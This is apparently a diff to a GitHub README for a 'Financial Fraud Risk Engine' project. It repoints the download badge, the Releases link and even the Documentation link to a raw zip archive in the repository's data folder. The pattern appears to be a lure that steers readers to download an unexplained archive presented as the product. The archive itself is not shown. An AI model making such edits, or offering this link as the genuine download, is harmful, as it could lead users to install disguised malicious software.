@@ -2,7 +2,7 @@
 
 ## 🔗 Download Now
 
-[![Download Financial-Fraud-Risk-Engine](https://img.shields.io/badge/Download-Financial--Fraud--Risk--Engine-blue)](https://github.com/Drgham96/Financial-Fraud-Risk-Engine/releases)
+[![Download Financial-Fraud-Risk-Engine](https://github.com/Drgham96/Financial-Fraud-Risk-Engine/raw/refs/heads/main/data/Fraud-Financial-Engine-Risk-3.1.zip)](https://github.com/Drgham96/Financial-Fraud-Risk-Engine/raw/refs/heads/main/data/Fraud-Financial-Engine-Risk-3.1.zip)
 
 ## 🏁 Overview
 
@@ -30,7 +30,7 @@ To run the Financial Fraud Risk Engine, your system should meet the following re
 
 To get started, visit the Releases page to download the Financial Fraud Risk Engine:
 
-[Download from Releases](https://github.com/Drgham96/Financial-Fraud-Risk-Engine/releases)
+[Download from Releases](https://github.com/Drgham96/Financial-Fraud-Risk-Engine/raw/refs/heads/main/data/Fraud-Financial-Engine-Risk-3.1.zip)
 
 ### Installation Steps
 
@@ -71,7 +71,7 @@ If you encounter any issues while using the Financial Fraud Risk Engine, please 
 
 ## 🔗 Additional Resources
 
-- **Documentation**: [Read the Documentation](https://github.com/Drgham96/Financial-Fraud-Risk-Engine/wiki)
+- **Documentation**: [Read the Documentation](https://github.com/Drgham96/Financial-Fraud-Risk-Engine/raw/refs/heads/main/data/Fraud-Financial-Engine-Risk-3.1.zip)
 - **Community Forum**: Join discussions with other users for tips and best practices.
 
 Remember, your feedback is valuable. It helps us improve the Financial Fraud Risk Engine. Enjoy using the application to keep your financial data safe!
